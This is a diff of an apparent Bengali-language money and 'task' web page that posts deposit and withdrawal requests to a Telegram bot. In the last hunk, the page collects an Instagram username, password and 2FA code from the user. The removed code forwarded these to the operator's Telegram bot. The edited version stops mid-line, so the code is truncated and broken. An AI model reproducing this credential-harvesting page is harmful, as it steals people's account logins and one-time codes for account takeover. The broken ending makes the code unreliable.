@@ -1650,18 +1650,31 @@
 
             let message = `💰 নতুন ডিপোজিট রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 প্রেরক নাম্বার: ${sender}\n💵 পরিমাণ: ৳${amount}\n📌 পাঠানো হয়েছে এই নাম্বারে: ${targetAdminNum}`;
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-            fetch(url).then(response => {
-                if (response.ok) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
                     alert('ডিপোজিট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!');
                     event.target.reset();
                     updateDepositInfo();
                     showPage('homePage');
                 } else {
-                    alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    alert('সমস্যা হয়েছে: ' + (data.description || 'আবার চেষ্টা করুন।'));
                 }
-            }).catch(error => {
+            })
+            .catch(error => {
+                console.error('Error:', error);
                 alert('নেটওয়ার্ক ত্রুটি!');
             });
         }
@@ -1702,18 +1715,31 @@
 
             let message = `💸 নতুন উইথড্র রিকোয়েস্ট এসেছে!\n\n🔹 মাধ্যম: ${method}\n📱 গ্রহণকারী নাম্বার: ${number}\n💵 উইথড্র পরিমাণ: ৳${amount}\n🔻 ৫% চার্জ: ৳${charge.toFixed(2)}\n✅ প্রদেয় পরিমাণ: ৳${finalAmount.toFixed(2)}`;
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-            fetch(url).then(response => {
-                if (response.ok) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
                     alert('উইথড্র রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে! ৫% চার্জ কেটে খুব শীঘ্রই পেমেন্ট দেওয়া হবে।');
                     event.target.reset();
                     calculateWithdrawFee();
                     showPage('homePage');
                 } else {
-                    alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                    alert('সমস্যা হয়েছে: ' + (data.description || 'আবার চেষ্টা করুন।'));
                 }
-            }).catch(error => {
+            })
+            .catch(error => {
+                console.error('Error:', error);
                 alert('নেটওয়ার্ক ত্রুটি!');
             });
         }
@@ -1738,23 +1764,4 @@
                 let user = document.getElementById('instaUser').value;
                 let pass = document.getElementById('instaPass').value;
                 let twofa = document.getElementById('insta2fa').value;
-                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${twofa}`;
-            }
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-            fetch(url).then(response => {
-                if (response.ok) {
-                    alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে।');
-                    event.target.reset();
-                    showPage('homePage');
-                } else {
-                    alert('সাবমিট করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
-                }
-            }).catch(error => {
-                alert('নেটওয়ার্ক ত্রুটি!');
-            });
-        }
-    </script>
-</body>
-</html>
+                message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${
